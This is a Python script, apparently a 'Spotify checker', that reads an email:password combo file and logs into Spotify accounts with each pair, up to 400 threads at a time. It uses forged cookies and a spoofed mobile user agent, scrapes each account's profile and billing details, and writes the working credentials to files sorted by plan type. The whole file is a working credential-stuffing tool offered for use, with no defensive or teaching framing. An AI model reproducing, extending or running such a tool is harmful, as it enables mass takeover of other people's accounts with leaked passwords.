# -*- coding: utf-8 -*-

from datetime import date
from threading import active_count, Thread
import json, os, platform, random, re, requests, sys, threading, traceback

timeToday = date.today()
today = timeToday.strftime('%d-%m-%Y')
empass = []
threads = []
results = {
    'free': 0,
    'premium': 0,
    'member': 0,
    'owner': 0,
    'unknown': 0,
    'invalid': 0
}

bool_dict = {
    'yes': True,
    'no': False,
    'y': True,
    'n': False
}

class SafeDict(dict):
    def __missing__(self, key):
        return results[key]

def clearTerminal():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

def displayMenu():
    clearTerminal()
    print('''
        ╔═╗ ┌─┐ ┌─┐ ┌┬┐ ┬ ┌─┐ ┬ ┬   ╔═╗ ┬ ┬ ┌─┐ ┌─┐ ┬┌─ ┌─┐ ┬─┐
        ╚═╗ ├─┘ │ │  │  │ ├┤  └┬┘   ║   ├─┤ ├┤  │   ├┴┐ ├┤  ├┬┘
        ╚═╝ ┴   └─┘  ┴  ┴ └    ┴    ╚═╝ ┴ ┴ └─┘ └─┘ ┴ ┴ └─┘ ┴└─
    ''')
    res = 'Checked         :   {checked}/{total}\n'
    res+= 'Free            :   {free}\n'
    res+= 'Premium         :   {premium}\n'
    res+= 'Family Member   :   {member}\n'
    res+= 'Family Owner    :   {owner}\n'
    res+= 'Unknown         :   {unknown}\n'
    res+= 'Invalid         :   {invalid}'
    print (res.format_map(SafeDict(
        checked=sum(list(results.values())),
        total=len(empass)
    )))

def loadFile(fileName):
    if os.path.exists(fileName):
        with open(fileName, 'r', encoding='utf-8', errors='ignore') as file:
            for x in file.read().split('\n'):
                account = x.split(':')
                empass.append({'email': account[0], 'password': account[1]})
    else:
        raise Exception('File not found')

def logError(error):
    traceback.print_tb(error.__traceback__)
    print ('++ Error :', error)

def getCSRF() :
    r = requests.get('https://accounts.spotify.com')
    if r.status_code == 200:
        return r.cookies.get('csrf_token')

def getCookies(csrf_token):
    return {
        'fb_continue': 'https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F',
        'sp_landing': 'play.spotify.com%2F',
        'sp_landingref': 'https%3A%2F%2Fwww.google.com%2F',
        'user_eligible': '0',
        'spot': '%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D',
        'sp_t': 'ac1439ee6195be76711e73dc0f79f89',
        'sp_new' : '1',
        'csrf_token' : csrf_token,
        '__bon' : 'MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=',
        'remember' : 'false@false.com',
        '_ga' : 'GA1.2.153026989.1498061376',
        '_gid' : 'GA1.2.740264023.1498061376'
    }

def getJSON(text):
    regex = re.search(r"spweb.account.spa\['renderOverview'\]\(*(\{.+\})\)", text)
    if regex:
        return json.loads(regex.group(1))
    return {}

def getHeaders():
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1'
    }

def displayInfo(data, email, password):
    res = '========== S P O T I F Y    C H E C K E R =========='
    profile = {'Email':email, 'Password':password}
    for i in range(len(data['profile']['fields'])):
        field = data['profile']['fields'][i]
        profile[field['label']] = field['value']
    for key, value in profile.items():
        res += f'\n{key} : {value}'
    if 'paymentInfo' in data['plan'] and data['plan']['paymentInfo'] and 'billingInfo' in data['plan']['paymentInfo']:
        if 'recurring-date' in data['plan']['paymentInfo']:
            res += '\nExpired : ' + data['plan']['paymentInfo']['billingInfo'].split('recurring-date">')[1].replace('</b>.', '')
    res += '\nAccount Type : ' + data['plan']['plan']['name']
    res += '\nCombo : {email}:{password}'.format(email=email, password=password)
    res += '\n==========  H E L L O    W O R L D ==========\n\n'
    return res

def loginAccount(email, password):
    try:
        csrf_token = getCSRF()
        session = requests.Session()
        cookies = getCookies(csrf_token)
        headers = getHeaders()
        payload = {
            'remember':'true',
            'username':email,
            'password':password,
            'csrf_token':csrf_token
        }

        reqLogin = session.post('https://accounts.spotify.com/api/login', data=payload, headers=headers, cookies=cookies)
        if 'error' in reqLogin.text:
            results['invalid'] += 1
            #print ('++ [ DIE ] %s:%s' % (email, password))
        else:
            reqAccount = session.get('https://www.spotify.com/uk/account/overview/')
            data = getJSON(reqAccount.text)
            if data:
                info = displayInfo(data, email, password)
                planName = data['plan']['plan']['name']
                if planName == 'Spotify Free':
                    #print ('++ [ FREE ] %s:%s' % (email, password))
                    with open('results/%s/free.txt'%today, 'a+') as f:
                        f.write(info)
                    results['free'] += 1
                elif 'Family' in planName:
                    if data['plan']['cta']['gaData']['label'] in ['family-plan', 'family-plan-downgrading-to-premium']:
                        #print ('++ [ OWNER ] %s:%s' % (email, password))
                        with open('results/%s/Owner.txt'%today, 'a+') as f:
                            f.write(info)
                        results['owner'] += 1
                    else:
                        #print ('++ [ MEMBER ] %s:%s' % (email, password))
                        with open('results/%s/Member.txt'%today, 'a+') as f:
                            f.write(info)
                        results['member'] += 1
                elif 'Premium' in planName:
                    #print ('++ [ PREMIUM ] %s:%s' % (email, password))
                    with open('results/%s/Premium.txt'%today, 'a+') as f:
                        f.write(info)
                    results['premium'] += 1
                else:
                    #print ('++ [ UNKNOWN ] %s:%s' % (email, password))
                    with open('results/%s/Unknown.txt'%today, 'a+') as f:
                        f.write(info)
                    results['unknown'] += 1
            else:
                results['invalid'] += 1
                #print ('++ [ DIE ] %s:%s' % (email, password))
    except Exception as error:
        logError(error)

def runProgram(use_thread):
    if not os.path.exists('results/'+today): os.makedirs('results/'+today)
    for allEmailAndPassword in empass:
        displayMenu()
        if use_thread:
            if active_count() < 400:
                thread = Thread(target=loginAccount, args=(allEmailAndPassword['email'], allEmailAndPassword['password'], ))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            else:
                loginAccount(allEmailAndPassword['email'], allEmailAndPassword['password'])
        else:
            loginAccount(allEmailAndPassword['email'], allEmailAndPassword['password'])
    for thread in threads:
        thread.join()
    #displayMenu()


if __name__ == '__main__':
    clearTerminal()
    use_thread = bool_dict[input('Using Thread (y/n) : ').lower()]
    fileName = input('Input Your File Name : ')
    loadFile(fileName)
    runProgram(use_thread)
